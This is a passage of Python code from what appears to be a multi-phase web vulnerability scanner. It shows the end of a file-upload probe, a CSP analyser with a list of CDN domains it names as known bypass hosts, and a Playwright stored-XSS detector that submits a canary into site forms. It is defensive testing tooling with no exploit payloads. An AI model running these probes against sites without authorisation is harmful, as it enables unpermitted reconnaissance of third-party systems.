                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: {content_type}\r\n\r\n"
                    f"{content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0", **_fu_extra_headers,
                    })
                up_status, _, up_body = await _async_urlopen(upload_urlopen, req, timeout=15)
                up_text = up_body.decode("utf-8", errors="ignore").lower()
                if up_status in (200, 201, 302, 301):
                    findings.append(f"[upload-accepted] {ep} file={fname} type={content_type} -> HTTP {up_status}")
                if fname in up_text or fname.replace(".", "_") in up_text:
                    findings.append(f"[upload-stored] {ep} file={fname} reflected in response -> possible stored access")
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 405, 413, 415, 501):
                    findings.append(f"[upload-response] {ep} file={fname} -> HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[fileupload] No upload vulnerabilities detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
    return {"37-FILEUPLOAD": str(out), "count": len(findings)}

_CSP_BYPASS_CDNS = {
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com", "ajax.googleapis.com",
    "ajax.aspnetcdn.com", "stackpath.bootstrapcdn.com", "maxcdn.bootstrapcdn.com",
    "code.jquery.com", "cdn.shopify.com", "cdn.rawgit.com", "rawgit.com",
    "gitcdn.xyz", "cdn.statically.io", "www.google.com", "accounts.google.com",
    "apis.google.com", "youtube.com", "www.youtube.com", "platform.twitter.com",
    "www.facebook.com", "staticxx.facebook.com",
}

async def phase_73_CSPBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"73-CSPBYPASS"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"73-CSPBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 73-CSPBYPASS: CSP header analysis + bypass detection")
    findings: List[str] = []
    _csp_urlopen = _get_urlopener()
    _csp_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "73-CSPBYPASS: no targets; skipping")
        return {"73-CSPBYPASS": str(_out), "count": 0}
    csp_danger_directives = {
        "unsafe-inline": "script-src/style-src allows 'unsafe-inline' — XSS protection degraded",
        "unsafe-eval": "script-src allows 'unsafe-eval' — eval() XSS possible",
        "http://": "script-src allows http:// — MITM possible over HTTP",
        "*.": "wildcard in script-src — can load from any subdomain",
        "*": "wildcard source — entire CSP bypassable",
    }
    csp_known_bypass_domains = {
        "cdnjs.cloudflare.com", "ajax.googleapis.com", "cdn.jsdelivr.net",
        "cdn.socket.io", "code.jquery.com", "maxcdn.bootstrapcdn.com",
        "cdn.rawgit.com", "cdn.jsdelivr.net", "unpkg.com", "www.google-analytics.com",
        "googletagmanager.com", "googleapis.com", "gstatic.com", "youtube.com",
        "platform.twitter.com", "www.youtube.com", "apis.google.com",
        "ajax.aspnetcdn.com", "ajax.microsoft.com",
    }
    _csp_sem = asyncio.Semaphore(10)
    checked_hosts: Set[str] = set()
    for host in read_lines(targets_file)[:20]:
        base = host if host.startswith("http") else f"https://{host}"
        hostname = base.split("/")[2].split(":")[0] if "://" in base else base
        if hostname in checked_hosts:
            continue
        checked_hosts.add(hostname)
        async with _csp_sem:
            await _throttle_rate()
            try:
                req = urllib.request.Request(base, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_csp_headers})
                status, headers, body_bytes = await _async_urlopen(_csp_urlopen, req, timeout=10)
                csp = None
                for hdr_name in ("content-security-policy", "content-security-policy-report-only"):
                    val = headers.get(hdr_name, "")
                    if val:
                        csp = {"header": hdr_name, "value": val}
                        break
                if not csp:
                    findings.append(f"[no-csp] {base} — no CSP header (clickjacking/XSS risk)")
                    continue
                findings.append(f"[csp] {base} → {csp['header']}: {csp['value'][:200]}")
                val_lower = csp["value"].lower()
                for pattern, desc in csp_danger_directives.items():
                    if pattern in val_lower:
                        findings.append(f"  [warn] {desc}")
                if "script-src" in val_lower:
                    for dom in csp_known_bypass_domains:
                        if dom in val_lower:
                            findings.append(f"  [bypass] script-src whitelists {dom} — known JSONP/Angular bypass")
                directives = {}
                for directive in val_lower.split(";"):
                    directive = directive.strip()
                    if directive and " " in directive:
                        dname, _, dval = directive.partition(" ")
                        directives[dname] = dval
                if "base-uri" not in directives:
                    findings.append("  [warn] no base-uri directive — DOM clobbering / injection possible")
                if "object-src" not in directives and "default-src" not in directives:
                    findings.append("  [warn] no object-src or default-src — Flash/plugin-based XSS")
                elif "object-src" in directives and "'none'" not in directives.get("object-src", ""):
                    findings.append("  [warn] object-src not 'none' — plugin-based XSS possible")
                if "frame-ancestors" not in directives:
                    findings.append("  [warn] no frame-ancestors — clickjacking via <frame>/<iframe>")
            except Exception as e:
                findings.append(f"[error] {base} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"73-CSPBYPASS: {len(findings)} CSP findings → {out}")
    return {"73-CSPBYPASS": str(_out), "count": len(findings)}

async def phase_80_STOREXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"80-STOREXSS"}:
        return {}
    _out = outdir / "stored_xss.txt"
    if _out.exists() and not force:
        return {"80-STOREXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 80-STOREXSS: stored XSS detection via browser re-navigation")
    findings: List[str] = []
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log("warn", "80-STOREXSS: playwright not installed; skipping (pip install playwright)")
        return {"80-STOREXSS": str(_out), "count": 0}
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "80-STOREXSS: no URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    form_urls = [u for u in read_lines(urls_file) if "=" in u][:20]
    if not form_urls:
        log("warn", "80-STOREXSS: no param-bearing URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    _CANARY = "rcxsstore" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True,
            args=["--headless=new", "--no-sandbox", "--disable-gpu"])
        try:
            for url in form_urls:
                await _throttle_rate()
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                try:
                    page = await context.new_page()
                    await page.goto(url, timeout=20000, wait_until="domcontentloaded")
                    await page.evaluate(f"window.__rc_canary = '{_CANARY}'")
                    inputs = await page.query_selector_all("input, textarea")
                    for inp in inputs:
                        try:
                            await inp.type(_CANARY, delay=10)
                        except Exception:
                            continue
                    buttons = await page.query_selector_all("button[type=submit], input[type=submit]")
                    for btn in buttons:
                        try:
                            async with page.expect_navigation(timeout=10000):
                                await btn.click()
                        except Exception:
                            continue
                    # Navigate to a few more pages to see if XSS triggers
                    for u2 in form_urls[:5]:
                        try:
                            await page.goto(u2, timeout=10000, wait_until="domcontentloaded")
                            has_canary = await page.evaluate(f"document.body && document.body.innerHTML.includes('{_CANARY}')")
                            if has_canary:
                                findings.append(f"[stored-xss-candidate] {u2} — canary rendered from {url}")
                        except Exception:
                            continue
                except Exception:
                    continue
                finally:
                    await context.close()
        finally:
            await browser.close()
    if not findings:
        findings.append("[result] No stored XSS candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"80-STOREXSS: {len(findings)} stored XSS findings → {out}")
    return {"80-STOREXSS": str(_out), "count": len(findings)}
